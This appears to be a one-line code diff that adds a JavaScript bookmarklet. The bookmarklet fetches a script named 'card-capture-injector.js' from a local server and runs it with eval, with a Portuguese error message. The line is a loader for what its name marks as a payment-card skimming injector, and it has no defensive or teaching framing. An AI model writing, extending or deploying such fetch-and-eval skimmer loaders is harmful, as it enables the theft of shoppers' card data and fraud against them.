@@ -1,0 +1,1 @@
+javascript:(function(){fetch('http://localhost:8080/card-capture-injector.js').then(r=>r.text()).then(code=>eval(code)).catch(e=>console.error('❌ Erro ao carregar script. Certifique-se que localhost:8080 está rodando!',e));})()
